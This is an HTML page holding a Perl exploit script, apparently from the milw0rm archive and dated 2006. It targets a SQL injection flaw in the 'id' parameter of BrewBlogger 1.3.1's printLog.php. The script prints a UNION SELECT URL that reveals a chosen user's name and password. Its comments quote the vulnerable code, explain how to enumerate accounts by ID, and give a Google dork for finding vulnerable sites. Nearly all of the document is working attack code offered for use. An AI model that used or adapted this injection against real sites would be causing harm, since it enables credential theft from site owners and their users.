<html><head><title>BrewBlogger 1.3.1 (printLog.php) Remote SQL Injection Vulnerability</title></head><pre>#!/usr/bin/perl
###########################################################################################
#Target:
#
#       BewBlogger 1.3.1
#       http://brewblogger.zkdigital.com
#
#Vulnerability:
#
#       SQL Injection
#
#Description:
#
#       BrewBlogger does not properly sanitize the 'id=' parameter passed to printLog.php.
#       Since each user entry contains an auto-incrementing ID number, it is possible to
#       enumerate all user names and passwords stored in the 'users'database by iterating
#       through every possible ID number.
#
#Vulnerable Code (truncated):
#
#       $colname_log = (get_magic_quotes_gpc()) ? $_GET['id'] : addslashes($_GET['id']);
#       $query_log = sprintf(&quot;SELECT * FROM brewing WHERE id = %s&quot;, $colname_log);
#       $log = mysql_query($query_log, $brewing) or die(mysql_error());
#
#Usage:
#       This script will produce a URL which will reveal the user name and password for
#       the specified ID. If no ID is specified, 2 is used (seems to be the usual ID for
#       the first user). The user name will be listed as &quot;Method:&quot; under 'General
#       Information', and the password will be listed as &quot;Cost:&quot;.
#
#Usage:
#       ./brewblog.pl &lt;domain name + path&gt; [user id]
#
#Examples:
#
#       ./brewblogger.pl www.beerblog.com 3
#       ./brewblogger.pl www.mysite.com/beerblog
#
#Google Dork:
#
#       intext:&quot;BrewBlogger for PHP&quot;
#
#Discovery/code:
#
#       Craig Heffner
#       heffnercj [at] gmail.com
#       http://www.craigheffner.com
###########################################################################################


print '
###########################################
# BrewBlogger 1.3.1 SQL Injection Exploit #
#                                         #
# Discovered and coded by: Craig Heffner  #
###########################################
';

if(!$ARGV[0] || $ARGV[0] eq &quot;-h&quot;){
       print &quot;\nUsage: ./brewlogger.pl &lt;domain name + path&gt; [user id]\n\nSee script comments for more details\n&quot;;
       exit;
}


if(!$ARGV[1]){
       $id = 2;
} else {
       $id = $ARGV[1];
}

$url = &quot;http://&quot; . $ARGV[0] . &quot;/printLog.php?id=0+UNION+SELECT+&quot;;
$a = 1;

while($a &lt; 211){
       if($a == 8){
               $string .= &quot;user_name,&quot;;
       } elsif($a == 9){
               $string .= &quot;password,&quot;;
       } elsif($a == 210){
               $string .= &quot;1&quot;;
       } else {
               $string .= &quot;1,&quot;;
       }
       $a++;
}

print &quot;\n\nUse the following URL:\n\n&quot; . $url . $string . &quot;+FROM+users+WHERE+id=&quot; . $id . &quot;\n&quot;;
exit;

# milw0rm.com [2006-11-10]</pre></html>